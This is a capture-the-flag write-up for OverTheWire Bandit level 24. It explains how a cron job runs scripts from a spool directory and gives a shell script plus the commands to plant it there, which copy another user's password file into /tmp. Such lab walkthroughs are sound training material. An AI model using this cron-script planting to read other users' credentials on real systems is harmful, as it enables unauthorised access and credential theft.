# [Bandit Level 23 → Level 24](https://overthewire.org/wargames/bandit/bandit24.html)
## Level Goal

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around...

## Solution

`cat /etc/cron.d/cronjob_bandit24` then `cat /usr/bin/cronjob_bandit24.sh`. You will see this script

```sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

It executes all scripts in `/var/spool/$myname/foo` at regular intervals from **cron** (`$myname` = **bandit24**) and delete them after 60 seconds

My idea is to write a script to get the password from `/etc/bandit_pass/bandit24` and then store it in a file

First, create a directory like [level 13](https://github.com/T3l3sc0p3/ctf-writeups/blob/master/OverTheWire/Bandit/level-13.md) and navigate to it. Then, create a [shell script](assets/level-24/script/shell.sh) using the command `vi shell.sh`

```sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/telescope/passwd.txt
```

Next, we give the permission to shell-script by using the command `chmod a+x shell.sh`

Finally, copy the shell script to `/var/spool/bandit24/foo` using the command `cp shell.sh /var/spool/bandit24/foo/.` and wait for a minute to receive the password
